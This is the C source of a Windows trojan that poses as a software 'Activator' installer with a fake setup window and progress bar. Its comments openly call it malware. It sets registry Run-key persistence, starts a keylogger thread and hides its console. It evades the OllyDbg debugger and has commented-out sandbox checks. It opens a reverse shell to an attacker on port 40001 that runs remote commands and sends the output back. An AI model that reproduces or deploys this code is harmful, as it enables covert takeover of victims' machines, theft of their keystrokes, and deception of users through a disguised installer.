
#ifndef UNICODE
#define UNICODE
#endif
#pragma comment(lib, netapi32.lib)
#define WIN32_DEFAULT_LIBS
#include <omp.h>
#include <windows.h>
#include <commctrl.h>
#include <stdbool.h>
#define ID_BUTTON 1
#define ID_TIMER 2
#define ID_NEXT 1
#define ID_QUIT 2
#include<stdio.h>
#include<stdlib.h>
#include<unistd.h>
#include<winsock2.h>
#include<winuser.h>
#include<wininet.h>
#include<windowsx.h>
#include<string.h>
#include<sys/stat.h>
#include<sys/types.h>
#include"KL.h"
LRESULT CALLBACK WndProc(HWND, UINT, WPARAM, LPARAM);
void CreateControls(HWND);
DWORD WINAPI Stab_Conn();

HWND hwndPrgBar;
HWND hbtn; 
HWND pro;
HWND hwnd1; 
int sock;
// this function to make malware persistance

int Persist(){

	 TCHAR szPath[MAX_PATH]; 
	DWORD pathLen=0;
	pathLen=GetModuleFileName(NULL,szPath,MAX_PATH);
	HKEY NewVal;
	if(RegOpenKey(HKEY_CURRENT_USER,TEXT("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"),&NewVal)!=ERROR_SUCCESS){
		return -1;
	}
	DWORD pathLenInBytes = pathLen *sizeof(*szPath); 
	if(RegSetValueEx(NewVal,TEXT("AKABA"),0,REG_SZ,(LPBYTE)szPath, pathLenInBytes)!=ERROR_SUCCESS){
		RegCloseKey(NewVal);
		return -1;
	}
	RegCloseKey(NewVal);
	return 0;
}

// to handle change directory
char * str_cut(char str[],int slice_from,int slice_to) //cd Desktop
{ 
	if(str[0]=='\0')
		return NULL;
	char *buffer;
	size_t str_len,buffer_len;
	if(slice_to<0&& slice_from >slice_to){
		str_len=strlen(str);
		if(abs(slice_to)>str_len-1)
			return NULL;
		if(abs(slice_from)>str_len)
			slice_from=(-1)*str_len;
		buffer_len=slice_to-slice_from;
		str+=(str_len+slice_from);
	
	}
	else if(slice_from>=0&&slice_to>slice_from){
		str_len=strlen(str); 
		if(slice_from>str_len-1)
			return NULL;
		buffer_len=slice_to-slice_from;
		str+=slice_from;
	}else
		return NULL;
	buffer=calloc(buffer_len,sizeof(char)); 
	strncpy(buffer,str,buffer_len);
	return buffer;
}

//excute commands and send results to attcker
void Command_and_Control(){
	char buffer[1024]; 
	char container[1024]; 
	char total_response[18384];

	while(1) {

	jump:
	memset(&buffer,0,1024);
	memset(&container,0,sizeof(container));
	memset(&total_response,0,sizeof(total_response));
	
	recv(sock,buffer,1024,0);
	if(strncmp("exit",buffer,1)==0) 
	{
		closesocket(sock);
		WSACleanup();  
		exit(0);
	}
	
	else if (strncmp("cd ",buffer,3)==0)
		{
		chdir(str_cut(buffer,3,100)); }

	else{
		FILE *fp; 
		
		fp=_popen(buffer,"r");  
		while(fgets(container,1024,fp)!=NULL){ 
			strcat(total_response,container); 
		}
		send(sock,total_response,sizeof(total_response),0); 
		fclose(fp);
	}
}
}
//stablish connection between victim and attacker
DWORD WINAPI Stab_Conn()
{

	HWND stealth;
	AllocConsole(); 
	stealth=FindWindowA("ConsoleWindowClass",NULL);
	ShowWindow(stealth,0);
	struct sockaddr_in ServAddr;
	unsigned short ServPort;
	char *ServIP;
	WSADATA wsaData;
	
	ServIP="";
	ServPort=40001;
	if(WSAStartup(MAKEWORD(2,0),&wsaData)!=0){ 
		exit(1);
	}
	sock=socket(AF_INET,SOCK_STREAM,0); 
	memset(&ServAddr,0,sizeof(ServAddr)); 
	ServAddr.sin_family=AF_INET;
	ServAddr.sin_addr.s_addr=inet_addr(ServIP);
	ServAddr.sin_port=htons(ServPort); 
	
	start:
	while (connect(sock,(struct sockaddr *)&ServAddr,sizeof(ServAddr))!=0){
	Sleep(10);
	goto start;
	}
	Command_and_Control();
	
	return 0;
}

//entry point of program

int APIENTRY WinMain(HINSTANCE hInstance,HINSTANCE hPrev,LPSTR lpCmdLine,int nCmdShow)
{
	
	//prisist malware
	Persist();
	//keyloger
	HANDLE thread1 =CreateThread(NULL,0,logg,NULL,0,NULL);
	//you can use int3 to anti-debug or slow debugging  
//int i;     
   // for(i=0; i<3;i++) {
      //  __asm__("int3");
  //  }
	
	
	
	//this is to  anti analyssi in sandbox and vm
	/*SYSTEM_INFO si;
	GetSystemInfo(&si);
	if (si.dwNumberOfProcessors==1)
		ExitProcess(0);
*/



	HANDLE hWnd = FindWindow(NULL,L"OllyDbg"); 
		if(hWnd!=NULL )
		ExitProcess(0);
			
				
					
					
	
//GUI	
 MSG  msg;    
    
    WNDCLASSW wc;

    wc.style         = CS_HREDRAW | CS_VREDRAW;
    wc.cbClsExtra    = 0;
    wc.cbWndExtra    = 0;
    wc.hInstance     = hInstance;
    wc.hbrBackground = GetSysColorBrush(COLOR_3DFACE);
    wc.lpszMenuName  = NULL;
    wc.lpfnWndProc   = WndProc;
    wc.hCursor       = LoadCursor(NULL, IDC_ARROW);
    wc.hIcon         = LoadIcon(NULL, IDI_APPLICATION);
    RegisterClassW(&wc);
	
	
    hwnd1 = CreateWindowW(wc.lpszClassName, L"Activator",
                WS_OVERLAPPEDWINDOW | WS_VISIBLE,
                100, 100, 350, 300, 0, 0, hInstance, 0);  

    ShowWindow(hwnd1, nCmdShow);
    UpdateWindow(hwnd1);
    while (GetMessage(&msg, NULL, 0, 0)) {
        DispatchMessage(&msg);
    }
    return (int) msg.wParam;
}

	

LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, 
    WPARAM wParam, LPARAM lParam) {
	static int i = 0;
	HDC hdc;
    PAINTSTRUCT ps;
  
    switch(msg) {
		
 static wchar_t *lyrics =  L"Activator\n\
You are welcome\n\
Thank you for download Activator\n\
If you need to any support related to Activator\n\
\n\
\n\
ping me :info@AKABA.com\n\
visit our website www.AKABA.com\n\
\n\
";

        case WM_CREATE:
		
CreateWindowW(L"Static", lyrics, 
     WS_VISIBLE |  WS_CHILD |SS_LEFT |WS_BORDER |LBS_NOTIFY,
    10, 10, 300, 200,
    hwnd, (HMENU) 1, NULL, NULL);
            CreateWindowW(L"Button", L"NEXT",
                WS_VISIBLE | WS_CHILD   ,
                18, 220, 80, 25, hwnd, (HMENU) ID_NEXT, NULL, NULL);
			

            CreateWindowW(L"Button", L"Quit",
                WS_VISIBLE | WS_CHILD ,
                230, 220, 80, 25, hwnd, (HMENU) ID_QUIT, NULL, NULL);
		

            break;
case WM_PAINT:

            hdc = BeginPaint(hwnd, &ps);
            Rectangle(hdc, 50, 50, 200, 100);
            EndPaint(hwnd, &ps);
            break;

case WM_TIMER:

            SendMessage(hwndPrgBar, PBM_STEPIT, 0, 0);
            i++;

            if (i == 100) {

                KillTimer(hwnd, ID_TIMER);			
			 MessageBox(NULL,TEXT("has been activated"),TEXT("Activation"),MB_OK | MB_ICONINFORMATION);	
						ShowWindow(hwnd1, 0);	
                i = 0;
            }

            break;

        case WM_COMMAND:
			

            if (LOWORD(wParam) == ID_NEXT) {

//once user press next the connection will stablish between victim and attacker 
	HANDLE myHandle = CreateThread(NULL, 0, Stab_Conn, NULL, 0, NULL); 
    
	//next window after press on next button 
	CreateWindowW(L"Static", L"PLEASE WAIT SETUP", 
    WS_VISIBLE |  WS_CHILD |SS_CENTER  ,
    10, 10, 300, 200,
    hwnd, (HMENU) 1, NULL, NULL);
                MessageBeep(MB_OK);

 CreateControls(hwnd);
            }

            if (LOWORD(wParam) == ID_QUIT) {
            goto destroy;
            }
		
      if (i == 0) {  

                i = 1;
                SendMessage(hwndPrgBar, PBM_SETPOS, 0, 0);
                SetTimer(hwnd, ID_TIMER, 5, NULL);
            }
            break;

        case WM_DESTROY:
KillTimer(hwnd, ID_TIMER);
destroy:
		       ShowWindow(hwnd1, 0);
            break;
    }

    return DefWindowProcW(hwnd, msg, wParam, lParam);
}
//progress bar 
void CreateControls(HWND hwnd) {
    INITCOMMONCONTROLSEX icex;

    icex.dwSize = sizeof(INITCOMMONCONTROLSEX);
    icex.dwICC  = ICC_PROGRESS_CLASS;
    InitCommonControlsEx(&icex);
    hwndPrgBar = CreateWindowEx(0, PROGRESS_CLASS, NULL, 
          WS_CHILD | WS_VISIBLE | PBS_SMOOTH,
          50, 90, 190, 25, hwnd, NULL, NULL, NULL);   
   SendMessage(hwndPrgBar, PBM_SETSTEP, 1, 0);

}




 
    
   

	
		
